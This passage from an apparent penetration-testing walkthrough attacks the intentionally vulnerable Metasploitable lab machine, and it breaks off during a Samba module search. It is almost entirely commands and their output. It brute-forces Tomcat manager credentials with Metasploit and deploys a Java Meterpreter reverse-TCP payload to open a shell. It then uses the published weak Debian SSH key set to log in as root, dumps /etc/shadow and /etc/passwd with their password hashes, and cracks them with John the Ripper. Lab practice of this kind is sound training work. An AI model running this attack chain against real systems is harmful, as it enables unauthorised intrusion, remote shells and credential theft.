+          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:53165 (51.9 KB)  TX bytes:53165 (51.9 KB)
+
+root@metasploitable:~# cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+root@metasploitable:~#
+
+7.) Enumerate port 8180/tcp - http - Apache Tomcat/Coyote JSP engine 1.1
+In Browser
+http://192.168.174.130:8180/
+
+In msf
+root@kali:~# msfconsole
+msf > search tomcat
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                Disclosure Date  Rank       Description
+   ----                                                ---------------  ----       -----------
+   auxiliary/admin/http/tomcat_administration                           normal     Tomcat Administration Tool Default Access
+   auxiliary/admin/http/tomcat_utf8_traversal                           normal     Tomcat UTF-8 Directory Traversal Vulnerability
+   auxiliary/admin/http/trendmicro_dlp_traversal                        normal     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   auxiliary/dos/http/apache_commons_fileupload_dos    2014-02-06       normal     Apache Commons FileUpload and Apache Tomcat DoS
+   auxiliary/dos/http/apache_tomcat_transfer_encoding  2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   auxiliary/dos/http/hashcollision_dos                2011-12-28       normal     Hashtable Collisions
+   auxiliary/scanner/http/tomcat_enum                                   normal     Apache Tomcat User Enumeration
+   auxiliary/scanner/http/tomcat_mgr_login                              normal     Tomcat Application Manager Login Utility
+   exploit/multi/http/struts_code_exec_classloader     2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution
+   exploit/multi/http/struts_default_action_mapper     2013-07-02       excellent  Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
+   exploit/multi/http/struts_dev_mode                  2012-01-06       excellent  Apache Struts 2 Developer Mode OGNL Execution
+   exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
+   post/windows/gather/enum_tomcat                                      normal     Windows Gather Apache Tomcat Enumeration
+
+
+msf > use auxiliary/scanner/http/tomcat_mgr_login
+msf auxiliary(tomcat_mgr_login) > show options 
+
+Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                                                                 Required  Description
+   ----              ---------------                                                                 --------  -----------
+   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
+   PASSWORD                                                                                          no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                                                            yes       The target address range or CIDR identifier
+   RPORT             8080                                                                            yes       The target port
+   STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host
+   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
+   THREADS           1                                                                               yes       The number of concurrent threads
+   USERNAME                                                                                          no        A specific username to authenticate as
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
+   VERBOSE           true                                                                            yes       Whether to print output for all attempts
+   VHOST                                                                                             no        HTTP server virtual host
+
+msf auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.174.130
+RHOSTS => 192.168.174.130
+msf auxiliary(tomcat_mgr_login) > set RPORT 8180
+RPORT => 8180
+msf auxiliary(tomcat_mgr_login) > set USERNAME tomcat
+USERNAME => tomcat
+msf auxiliary(tomcat_mgr_login) > set PASS_FILE /root/elitehacker.txt
+PASS_FILE => /root/elitehacker.txt
+msf auxiliary(tomcat_mgr_login) > exploit 
+
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:123456 (Incorrect: )
+<--- snip --->
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:truk (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:troubles (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:trottel (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:trinitron (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:tricia44 (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:tricia (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:tribute (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:tribe (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:toshiba (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:toad (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[!] No active DB -- Credential data will not be saved!
+[+] 192.168.174.130:8180 - LOGIN SUCCESSFUL: tomcat:tomcat
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:123456 (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:password (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+<--- snip --->
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:duck (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:drsmith (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:drowssap (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:drevil (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:drdre (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:draziw (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:dragonfly (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: admin:doritos (Incorrect: )
+<--- snip --->
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: both:green (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: both:greece (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:8180 TOMCAT_MGR - LOGIN FAILED: both:grassroots (Incorrect: )
+[!] No active DB -- Credential data will not be saved!
+<--- snip --->
+[*] Auxiliary module execution completed
+msf auxiliary(tomcat_mgr_login) > back
+msf > search tomcat
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                Disclosure Date  Rank       Description
+   ----                                                ---------------  ----       -----------
+   auxiliary/admin/http/tomcat_administration                           normal     Tomcat Administration Tool Default Access
+   auxiliary/admin/http/tomcat_utf8_traversal                           normal     Tomcat UTF-8 Directory Traversal Vulnerability
+   auxiliary/admin/http/trendmicro_dlp_traversal                        normal     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   auxiliary/dos/http/apache_commons_fileupload_dos    2014-02-06       normal     Apache Commons FileUpload and Apache Tomcat DoS
+   auxiliary/dos/http/apache_tomcat_transfer_encoding  2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   auxiliary/dos/http/hashcollision_dos                2011-12-28       normal     Hashtable Collisions
+   auxiliary/scanner/http/tomcat_enum                                   normal     Apache Tomcat User Enumeration
+   auxiliary/scanner/http/tomcat_mgr_login                              normal     Tomcat Application Manager Login Utility
+   exploit/multi/http/struts_code_exec_classloader     2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution
+   exploit/multi/http/struts_default_action_mapper     2013-07-02       excellent  Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
+   exploit/multi/http/struts_dev_mode                  2012-01-06       excellent  Apache Struts 2 Developer Mode OGNL Execution
+   exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
+   post/windows/gather/enum_tomcat                                      normal     Windows Gather Apache Tomcat Enumeration
+
+
+msf > use exploit/multi/http/tomcat_mgr_deploy
+msf exploit(tomcat_mgr_deploy) > show options 
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                      yes       The target address
+   RPORT     80               yes       The target port
+   USERNAME                   no        The username to authenticate as
+   VHOST                      no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
+USERNAME => tomcat
+msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
+PASSWORD => tomcat
+msf exploit(tomcat_mgr_deploy) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                            Disclosure Date  Rank    Description
+   ----                            ---------------  ----    -----------
+   generic/custom                                   normal  Custom Payload
+   generic/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline
+   java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager
+   java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager
+   java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager
+   java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager
+   java/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager
+   java/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager
+   java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline
+
+msf exploit(tomcat_mgr_deploy) > set payload java/meterpreter/reverse_tcp
+payload => java/meterpreter/reverse_tcp
+msf exploit(tomcat_mgr_deploy) > set RHOST 192.168.174.130
+RHOST => 192.168.174.130
+msf exploit(tomcat_mgr_deploy) > set RPORT 8180
+RPORT => 8180
+msf exploit(tomcat_mgr_deploy) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(tomcat_mgr_deploy) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Attempting to automatically select a target...
+[*] Automatically selected target "Linux x86"
+[*] Uploading 6478 bytes as 718eq4Wu6RHsupCFD7YDr5DyQ0.war ...
+[*] Executing /718eq4Wu6RHsupCFD7YDr5DyQ0/f0aF26qDbOS7R.jsp...
+[*] Undeploying 718eq4Wu6RHsupCFD7YDr5DyQ0 ...
+[*] Sending stage (30680 bytes) to 192.168.174.130
+[*] Meterpreter session 1 opened (192.168.174.137:4444 -> 192.168.174.130:53986) at 2016-01-24 00:59:33 -0500
+
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+whoami
+tomcat55
+hostname
+metasploitable
+ls -lah /root
+total 32K
+drwxr-xr-x  3 root root 4.0K 2010-05-17 21:43 .
+drwxr-xr-x 21 root root 4.0K 2010-04-28 17:25 ..
+-rw-------  1 root root   47 2016-01-23 21:37 .bash_history
+-rw-r--r--  1 root root 2.2K 2007-10-20 07:51 .bashrc
+-rw-------  1 root root  187 2010-04-28 16:21 .lesshst
+-rw-r--r--  1 root root  141 2007-10-20 07:51 .profile
+-rwx------  1 root root  401 2010-04-28 16:20 reset_logs.sh
+drwxr-xr-x  2 root root 4.0K 2010-05-17 21:44 .ssh
+ls -lah /root/.ssh
+total 12K
+drwxr-xr-x 2 root root 4.0K 2010-05-17 21:44 .
+drwxr-xr-x 3 root root 4.0K 2010-05-17 21:43 ..
+-rw-r--r-- 1 root root  405 2010-05-17 21:44 authorized_keys
+cat /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+
+In Browser
+https://www.exploit-db.com/exploits/5622/
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2
+
+In Kali
+root@kali:~/Desktop# tar xvjf 5622.tar.bz2 
+rsa/
+rsa/2048/
+rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
+rsa/2048/eaddc9bba9bf3c0832f443706903cd14-28712.pub
+rsa/2048/0bdcea11b2c628c7fd8bc4b04ca43668-12474
+rsa/2048/3fabfedd883c3cef69881a4fc30fdac7-3828.pub
+rsa/2048/a508919ec49fcf91ad0ecf8472349d9b-3039.pub
+rsa/2048/9ddc1879b9ac311f24a81e835aac5866-28340.pub
+rsa/2048/37cb6c02b84dfab70b7e0ad014a00414-27656.pub
+rsa/2048/17b33876782270d00f0aa284757e82ba-15477.pub
+rsa/2048/be74666ad474495ab736fc3202477d84-6942
+<--- snip --->
+rsa/2048/2df5993a79670bfbf518ccbe1c880698-6057
+rsa/2048/22395760ea6265919ef5db8d26dda56c-17578
+rsa/2048/e311fc52da0d062cd6e9a507a7470db8-15835.pub
+rsa/2048/ae88b6e25a832541ac60978e90fb40fe-28014
+rsa/2048/759ee1c853d2fcc07a13e6867ed75a35-26843
+rsa/2048/22817b9fcfca9c043d6d48dac528b0a6-3298
+rsa/2048/cd84c0196af31046b45037f39208c9c1-11710
+rsa/2048/9634a42c34d72e776593a9f1ddd38085-2633
+rsa/2048/1668b5d4171480a6359c0966ded47550-15730
+rsa/2048/b8a7774ef9e5b9b2b73a685e509b899b-2131
+root@kali:~/Desktop# 
+root@kali:~/Desktop/rsa/2048# grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w *.pub
+57c3115d77c56390332dc5c49978627a-5429.pub
+root@kali:~/Desktop/rsa/2048#
+
+SSH
+root@kali:~/Desktop/rsa/2048# ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.174.130
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have mail.
+root@metasploitable:~# whoami
+root
+root@metasploitable:~# hostname
+metasploitable
+root@metasploitable:~# ifconfig 
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:6e:13:ca  
+          inet addr:192.168.174.130  Bcast:192.168.174.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe6e:13ca/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:49197 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1168 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:2965439 (2.8 MB)  TX bytes:79255 (77.3 KB)
+          Interrupt:17 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:104 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:53165 (51.9 KB)  TX bytes:53165 (51.9 KB)
+
+root@metasploitable:~# cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+root@metasploitable:~#
+
+root@metasploitable:~# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+root@metasploitable:~# 
+
+Cracking the password with JTR
+root@kali:~# unshadow passwd shadow > password.txt
+root@kali:~# cat password.txt 
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/bin/sh
+bin:*:2:2:bin:/bin:/bin/sh
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/bin/sh
+man:*:6:12:man:/var/cache/man:/bin/sh
+lp:*:7:7:lp:/var/spool/lpd:/bin/sh
+mail:*:8:8:mail:/var/mail:/bin/sh
+news:*:9:9:news:/var/spool/news:/bin/sh
+uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:*:13:13:proxy:/bin:/bin/sh
+www-data:*:33:33:www-data:/var/www:/bin/sh
+backup:*:34:34:backup:/var/backups:/bin/sh
+list:*:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:*:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:!:100:101::/var/lib/libuuid:/bin/sh
+dhcp:*:101:102::/nonexistent:/bin/false
+syslog:*:102:103::/home/syslog:/bin/false
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
+sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:*:105:113::/var/cache/bind:/bin/false
+postfix:*:106:115::/var/spool/postfix:/bin/false
+ftp:*:107:65534::/home/ftp:/bin/false
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:*:111:65534::/:/bin/false
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
+telnetd:*:112:120::/nonexistent:/bin/false
+proftpd:!:113:65534::/var/run/proftpd:/bin/false
+root@kali:~# 
+root@kali:~# john --single password.txt
+Loaded 7 password hashes with 7 different salts (FreeBSD MD5 [128/128 SSE2 intrinsics 12x])
+Remaining 2 password hashes with 2 different salts
+msfadmin         (msfadmin)
+guesses: 1  time: 0:00:00:00 DONE (Sun Jan 24 01:43:14 2016)  c/s: 5231  trying: root1907 - root1900
+Use the "--show" option to display all of the cracked passwords reliably
+root@kali:~# 
+root@kali:~# ssh msfadmin@192.168.174.130
+msfadmin@192.168.174.130's password: 
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+No mail.
+Last login: Mon May 17 21:42:51 2010
+msfadmin@metasploitable:~$ 
+
+8.) Enumerating port 139/tcp - netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP), 445/tcp - netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+In msf
+msf > search samba
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                            Disclosure Date  Rank       Description
+   ----                                            ---------------  ----       -----------
+   auxiliary/admin/smb/samba_symlink_traversal                      normal     Samba Symlink Directory Traversal
+   auxiliary/dos/samba/lsa_addprivs_heap                            normal     Samba lsa_io_privilege_set Heap Overflow
+   auxiliary/dos/samba/lsa_transnames_heap                          normal     Samba lsa_io_trans_names Heap Overflow
+   auxiliary/dos/samba/read_nttrans_ea_list                         normal     Samba read_nttrans_ea_list Integer Overflow
+   auxiliary/scanner/rsync/modules_list                             normal     Rsync Unauthenticated List Command
+   exploit/freebsd/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (*BSD x86)
+   exploit/linux/samba/chain_reply                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
+   exploit/linux/samba/lsa_transnames_heap         2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
+   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   exploit/linux/samba/trans2open                  2003-04-07       great      Samba trans2open Overflow (Linux x86)
+   exploit/multi/samba/nttrans                     2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
+   exploit/osx/samba/lsa_transnames_heap           2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/osx/samba/trans2open                    2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
+   exploit/solaris/samba/lsa_transnames_heap       2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/solaris/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
+   exploit/unix/misc/distcc_exec                   2002-02-01       excellent  DistCC Daemon Command Execution
